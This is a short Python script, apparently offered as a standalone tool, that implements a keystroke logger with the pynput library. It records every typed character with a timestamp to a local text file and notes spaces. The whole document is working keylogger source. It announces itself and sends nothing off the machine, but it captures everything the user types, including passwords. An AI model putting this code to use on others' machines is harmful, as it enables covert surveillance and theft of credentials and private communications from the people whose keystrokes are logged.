from pynput import keyboard
from datetime import datetime

def keyPressed(key):
    """Function to handle key press events. Logs keys to a file with timestamps."""
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            logKey.write(f"{timestamp}: {char}\n")
        except AttributeError:
            # This block handles special keys that do not have a .char attribute
            if key == keyboard.Key.space:
                # Example: Log space as a special character; adapt as needed
                logKey.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}: [SPACE]\n")
            else:
                print(f"Special key {key} pressed, not recorded.")
        finally:
            logKey.flush()

if __name__ == "__main__":
    print("Starting key logger. Press Ctrl+C to stop.")
    try:
        # Setup and start the listener
        listener = keyboard.Listener(on_press=keyPressed)
        listener.start()
        listener.join()
    except KeyboardInterrupt:
        print("\nKey logger terminated.")
    finally:
        if listener.running:
            listener.stop()
        print("Listener stopped.")